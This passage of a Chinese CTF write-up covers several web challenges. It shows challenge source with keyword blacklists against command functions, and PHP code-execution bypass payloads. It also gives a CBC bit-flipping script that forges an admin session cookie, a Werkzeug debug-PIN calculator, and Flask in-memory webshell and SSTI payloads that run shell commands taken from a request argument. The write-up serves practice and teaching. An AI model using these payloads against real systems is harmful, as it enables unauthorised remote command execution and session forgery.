class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>三种解法，第一种就是无参RCE，第二种就是正常命令执行(通过)</p><p>1.利用<code>(scandir(&quot;/&quot;))</code>列出指定目录中的文件和目录，然后<code>var_dump</code>打印出来：</p><p><code>flag=please_GIVE_me_flag&amp;task=var_dump(scandir(&quot;/&quot;))</code></p><p><img src="/img/hnctf1.png" alt="hnctf1"></p><p>2.看下请求头是按什么顺序：</p><p><code>flag=please_GIVE_me_flag&amp;task=print_r(getallheaders())</code></p><p><img src="/img/hnctf2.png" alt="hnctf2"></p><p>这里以<code>Host</code>和<code>User-Agent</code>开头，<code>Host</code>不能改，所以：把UA头改成<code>/flag</code>然后<code>highlight_file(next(getallheaders()))</code>直接输出<code>/flag</code>的内容：</p><p><img src="/img/hnctf3.png" alt="hnctf3"></p><p>或者直接加个<code>flag:/flag</code>头到最开始然后<code>highlight_file((pos(getallheaders())));</code>这个<code>pos</code>就是取第一个头。</p><p>第二种方法就是十六进制直接绕过关键字检测：</p><p><code>print(file_get_contents(&quot;\x2f\x66\x6c\x61\x67&quot;))</code>或者<code>highlight_file(&quot;\x2f\x66\x6c\x61\x67&quot;)</code></p><p>第三种就官方用的那个<code>array_map()</code>函数</p><p><code>task=array_map($_POST[&#39;a&#39;],$_POST[&#39;b&#39;])&amp;flag=please_give_me_flaG&amp;a=system&amp;b[]=ls</code></p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode<br><br><span class="hljs-keyword">import</span> json<br><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>key = get_random_bytes(AES.block_size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>app = Flask(__name__)<br><br>filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<br>            <span class="hljs-string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session).decode())<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;have a fun&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/hint&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():<br>    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/read&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br><br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<span class="hljs-string">&quot;you are not logged in&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session))<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        plain_session = decrypt(session)<br>        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;don\&#x27;t hack me&#x27;</span><br><br>        session_data = json.loads(plain_session)<br><br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&#x27;admin&#x27;</span>] :<br>            filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):<br>                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&#x27;Access to this file is forbidden.&#x27;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">return</span> f.read()<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&#x27;File not found.&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f&#x27;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not an administrator&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>给了<code>session</code>的加解密算法(AES，工作在CBC，<code>iv</code>和<code>key</code>完全随机)。首先要解决的问题就是如何进行<code>session</code>的伪造使得我们的<code>session</code>传过去被解密后<code>admin</code>字段的值为<code>1</code></p><p><a href="https://goodapple.top/archives/217">参考文章</a>，CBC字节反转攻击：</p><p>简单说就是我们可以通过修改上一组对应位置的密文实现修改当前组对应位置的明文：</p><p><img src="/img/hnctf12.png" alt="hnctf12"></p><p>把这东西套进题里：其实<code>A</code>就是初始向量<code>iv</code>对应位置的密文，对这个(上一组的)密文要怎么进行处理呢？把它和原有的明文异或，再和我们目标明文值异或。这时(下一组)对应位置的解密过程就成了最后一个式子，达到了在不知密钥的情况下修改密文的目的。</p><p><code>iv</code>这个初始向量没加密，直接在它这里修改。对于<code>&#123;&quot;admin&quot;:0&#125;</code>里<code>0</code>这位在第11位，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 导入 requests 库，用于发送 HTTP 请求</span><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode  <span class="hljs-comment"># 导入 base64 库，用于对 Base64 编码进行解码和编码</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes  <span class="hljs-comment"># 导入 Crypto 库中的 Util 模块的 number 子模块，用于将长整数转换为字节串</span><br><br><span class="hljs-comment"># 发送初始请求以获取 session cookie</span><br>url = <span class="hljs-string">&quot;http://hnctf.imxbt.cn:41219/&quot;</span>  <span class="hljs-comment"># 设置目标网址</span><br>response = requests.get(url)  <span class="hljs-comment"># 发送 GET 请求到目标网址，并获取响应对象</span><br>original = <span class="hljs-string">b&#x27;&#123;&quot;admin&quot;: 0&#125;&#x27;</span>  <span class="hljs-comment"># 定义原始会话内容，这里只保留了 admin=0</span><br>revised = <span class="hljs-string">b&#x27;&#123;&quot;admin&quot;: 1&#125;&#x27;</span>  <span class="hljs-comment"># 定义修改后的会话内容，将 admin=0 改为 admin=1</span><br><br><span class="hljs-comment"># 从响应头中获取 session cookie 值</span><br>session_cookie = response.cookies.get(<span class="hljs-string">&quot;session&quot;</span>)  <span class="hljs-comment"># 从响应的 cookies 中获取名为 &quot;session&quot; 的会话 cookie</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Session cookie: <span class="hljs-subst">&#123;session_cookie&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 解码 session cookie，分离 IV 和密文</span><br>session = b64decode(session_cookie)  <span class="hljs-comment"># 对 session_cookie 进行 Base64 解码，得到原始字节串</span><br>iv = session[:<span class="hljs-number">16</span>]  <span class="hljs-comment"># 获取 IV（Initialization Vector），前16字节为 IV</span><br>cipher = session[<span class="hljs-number">16</span>:]  <span class="hljs-comment"># 获取密文，从第16字节开始到结尾为密文部分</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;iv = &#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印 IV 的值</span><br>newb = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>) ^ <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>) ^ iv[<span class="hljs-number">10</span>]  <span class="hljs-comment"># 计算将原始值 &#x27;0&#x27; 改为 &#x27;1&#x27; 后的新 IV 的第11位</span><br>orib = iv[<span class="hljs-number">11</span>]  <span class="hljs-comment"># 获取原始 IV 的第11位</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;orib = &#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印原始 IV 的第11位</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;newb = &#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印新 IV 的第11位</span><br>new_iv = iv[:<span class="hljs-number">10</span>] + long_to_bytes(newb) + iv[<span class="hljs-number">11</span>:]  <span class="hljs-comment"># 构造新的 IV，只需修改第11位</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;new_iv = &#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印新 IV 的值</span><br>new_sess = b64encode(new_iv + cipher)  <span class="hljs-comment"># 将新的 IV 和原始密文拼接后进行 Base64 编码，得到新的会话 cookie</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;new_sess = &#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印新的会话 cookie</span><br></code></pre></td></tr></table></figure><p>当然也有别的修改方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>url = <span class="hljs-string">&quot;http://localhost:8000/&quot;</span><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;guest&quot;&#125;&#x27;</span><br>res = requests.get(url)<br>c = <span class="hljs-built_in">bytearray</span>(b64decode(res.cookies[<span class="hljs-string">&quot;session&quot;</span>]))<br>c[default_session.index(<span class="hljs-string">&quot;0&quot;</span>)] ^= <span class="hljs-number">1</span><br>evil = b64encode(c).decode()<br>res = requests.get(url, cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: evil&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>然后就是算<code>Pin</code>码，这里进控制台有两种方法，要么<code>/read</code>路由直接啥也不加就会报错，要么直接<code>/console</code>，我这里用第一种方法：</p><p><a href="https://xz.aliyun.com/t/8092">参考文章</a></p><p><img src="/img/hnctf8.png" alt="hnctf8"></p><p><code>username</code>获取，要么<code>root</code>要么<code>ctfUser</code></p><p><img src="/img/hnctf9.png" alt="hnctf9"></p><p><code>modname</code> 一般默认<code>flask.app</code></p><p><code>flask下app.py的绝对路径</code>：<code>/usr/lib/python3.9/site-packages/flask/app.py</code></p><p><code>str(uuid.getnode()) MAC地址</code> 读取这两个地址：<code>/sys/class/net/eth0/address 或者 /sys/class/net/ens33/address</code>，这题用的第一个：</p><p><img src="/img/hnctf10.png" alt="hnctf10"></p><p><code>02:42:ac:11:00:03</code></p><p><code>machine-id</code>：拼接<code>/proc/sys/kernel/random/boot_id</code>和<code>/proc/self/cgroup</code>，但黑名单过滤了<code>self</code>和<code>cgroup</code>。</p><p><a href="https://blog.csdn.net/weixin_63231007/article/details/131659892">绕过参考</a>，所以换成换成<code>/proc/1/cpuset</code></p><p>后面就直接抄其它师傅的脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctfUser&#x27;</span>,  <span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># 报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;22:32:4d:a2:8c:5c&quot;</span>.replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), <span class="hljs-number">16</span>)), <br>    <span class="hljs-comment">#&#x27;81843421246614&#x27;,#/sys/class/net/eth0/address 16进制转10进制</span><br><span class="hljs-comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id</span><br><span class="hljs-comment">#2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br><span class="hljs-comment"># 1. docker下不用读</span><br><span class="hljs-comment"># 2. dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f</span><br><span class="hljs-comment"># 3. 无权限 --&gt; ban了self和cgroup, 换成/proc/1/cpuset</span><br><span class="hljs-string">&#x27;dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f94024dd3686b6d6b6c42ca63810be24f999a5df85001add714e07927237cf525&#x27;</span><br><span class="hljs-comment">#/proc/self/cgroup</span><br><br><br>h = hashlib.sha1()<br><br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>    h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><br></code></pre></td></tr></table></figure><p>最后注意<code>flag</code>只有<code>root</code>能读，去翻环境变量：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&quot;env&quot;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p><img src="/img/hnctf5.png" alt="hnctf5"></p><p>只能进行一次命令执行且无回显&#x2F;部分命令没权限，直接打个内存马进去：</p><p><a href="https://xz.aliyun.com/t/10933?time__1311=mq+xB70QD=9xlxGgrDyiDcDjEKTr5DOneD&alichlgref=https://www.google.com/">python内存马分析</a></p><p><code>app.add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda:__import__(&#39;os&#39;).popen(&quot;cat /flag&quot;).read())</code></p><p><img src="/img/hnctf4.png" alt="hnctf4"></p><p>放个参数也行：</p><p><code>app.add_url_rule(&#39;/test&#39;,&#39;test&#39;,lambda:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())</code>，然后<code>cmd</code>执行命令</p><p>或者类似<code>SSTI</code>这种形式：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">cmd=render_template_string(&quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\<span class="hljs-name">&quot;app.add_url_rule(&#x27;/get&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())\&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><span class="language-xml">&quot;)</span><br></code></pre></td></tr></table></figure><h2 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h2><p><code>robots.txt</code>，下载<code>main-old.zip</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;mime/multipart&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> blacklistChars = []<span class="hljs-type">rune</span>&#123;<span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 设置路由</span><br>http.HandleFunc(<span class="hljs-string">&quot;/gojava&quot;</span>, compileJava)<br><br><span class="hljs-comment">// 设置静态文件服务器</span><br>fs := http.FileServer(http.Dir(<span class="hljs-string">&quot;.&quot;</span>))<br>http.Handle(<span class="hljs-string">&quot;/&quot;</span>, fs)<br><br><span class="hljs-comment">// 启动服务器</span><br>log.Println(<span class="hljs-string">&quot;Server started on :80&quot;</span>)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isFilenameBlacklisted</span><span class="hljs-params">(filename <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> _, char := <span class="hljs-keyword">range</span> filename &#123;<br><span class="hljs-keyword">for</span> _, blackChar := <span class="hljs-keyword">range</span> blacklistChars &#123;<br><span class="hljs-keyword">if</span> char == blackChar 